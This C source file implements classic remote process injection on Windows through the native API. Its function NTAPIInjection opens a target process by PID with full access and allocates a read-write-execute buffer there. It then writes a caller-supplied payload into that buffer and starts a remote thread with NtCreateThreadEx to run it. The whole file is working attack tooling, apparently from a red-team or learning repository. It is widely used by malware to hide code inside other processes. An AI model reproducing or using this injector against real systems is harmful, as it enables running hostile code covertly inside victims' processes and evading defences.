#include "injection.h"

//---------------------------------------------------------------------------------

VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD ErrorStatus
        ) {

    if (NULL == FunctionName || 0 == ErrorStatus) {
        WARN("either you didn't supply a function name"
                "or the function actually returned successfully");
    }

    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorStatus);
    return;

}

//---------------------------------------------------------------------------------

UINT_PTR GetNtFunctionAddress(
        _In_ HMODULE ModuleHandle,
        _In_ LPCSTR FunctionName
        ) {

    UINT_PTR FunctionAddress = 0;

    if (NULL == ModuleHandle) {
        WARN("Invalid module handle supplied");
        return 0;
    }

    FunctionAddress = (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName);
    if (0 == FunctionAddress) {
        PrettyFormat("GetProcAddress", GetLastError());
        return 0;
    }

    OKAY("[0x%p] got the address of %s!", (PVOID)FunctionAddress, FunctionName);
    return FunctionAddress;

}

//---------------------------------------------------------------------------------

BOOL NTAPIInjection(
        _In_ DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ SIZE_T PayloadSize
        ) {

    HANDLE   ProcessHandle = NULL;
    HANDLE   ThreadHandle  = NULL;
    HMODULE  NTDLLHandle   = NULL;
    PVOID    RemoteBuffer  = NULL;
    SIZE_T   BytesWritten  = 0;
    NTSTATUS STATUS        = 0;
    BOOL     STATE         = TRUE;

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID        = { (HANDLE)PID, NULL };

    if (NULL == Payload || 0 == PayloadSize) {
        WARN("payload's not set. exiting...");
        return FALSE;
    }

    INFO("initializing globals...");
    NTDLLHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NTDLLHandle) {
        PrettyFormat("GetModuleHandleW", GetLastError()); return FALSE; } OKAY("[0x%p] got the address of NTDLL!", NTDLLHandle);

    /* NtOpenProcess */
    fn_NtOpenProcess p_NtOpenProcess = 
        (fn_NtOpenProcess)GetNtFunctionAddress(
                NTDLLHandle, 
                "NtOpenProcess"
                );
    /* NtAllocateVirtualMemory */
    fn_NtAllocateVirtualMemory p_NtAllocateVirtualMemory = 
        (fn_NtAllocateVirtualMemory)GetNtFunctionAddress(
                NTDLLHandle, 
                "NtAllocateVirtualMemory"
                );
    /* NtWriteVirtualMemory */
    fn_NtWriteVirtualMemory p_NtWriteVirtualMemory = 
        (fn_NtWriteVirtualMemory)GetNtFunctionAddress(
                NTDLLHandle, 
                "NtWriteVirtualMemory"
                );
    /* NtCreateThreadEx */
    fn_NtCreateThreadEx p_NtCreateThreadEx = 
        (fn_NtCreateThreadEx)GetNtFunctionAddress(
                NTDLLHandle, 
                "NtCreateThreadEx"
                );
    /* NtWaitForSingleObject */
    fn_NtWaitForSingleObject p_NtWaitForSingleObject = 
        (fn_NtWaitForSingleObject)GetNtFunctionAddress(
                NTDLLHandle, 
                "NtWaitForSingleObject"
                );
    /* NtClose */
    fn_NtClose p_NtClose = 
        (fn_NtClose)GetNtFunctionAddress(
                NTDLLHandle, 
                "NtClose"
                );

    INFO("attempting to get a handle on the process (%ld)...", PID);
    STATUS = p_NtOpenProcess(
            &ProcessHandle,
            PROCESS_ALL_ACCESS,
            &OA,
            &CID
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtOpenProcess", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] got a handle on the process (%ld)", ProcessHandle, PID);

    STATUS = p_NtAllocateVirtualMemory(
            ProcessHandle,
            &RemoteBuffer,
            0,
            &PayloadSize,
            (MEM_COMMIT | MEM_RESERVE),
            PAGE_EXECUTE_READWRITE
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtAllocateVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] [RWX] allocated a %zu-byte buffer with PAGE_EXECUTE_READWRITE permissions!",
            RemoteBuffer, PayloadSize);

    STATUS = p_NtWriteVirtualMemory(
            ProcessHandle,
            RemoteBuffer,
            Payload,
            PayloadSize,
            &BytesWritten
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtWriteVirtualMemory", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    /* r/masterhacker */
    for (SIZE_T i = 0; i <= BytesWritten; i++) {
        printf("\r[*] [0x%p] [RWX] [%zu/%zu] writing payload to buffer...",
                RemoteBuffer, i, BytesWritten);
    }
    (VOID)puts("");

    STATUS = p_NtCreateThreadEx(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            &OA,
            ProcessHandle,
            RemoteBuffer,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
            );
    if (STATUS_SUCCESS != STATUS) {
        PrettyFormat("NtCreateThreadEx", STATUS);
        STATE = FALSE; goto CLEAN_UP;
    }
    OKAY("[0x%p] successfully created a thread! waiting for it to finish execution...", ThreadHandle);

    STATUS = p_NtWaitForSingleObject(
            ThreadHandle,
            FALSE,
            NULL
            );
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEAN_UP:

    /* you should look into using NtFreeVirtualMemory
       for cleanup as well for our allocated buffer. */

    if (ThreadHandle) {
        p_NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        p_NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return STATE;

}

//---------------------------------------------------------------------------------
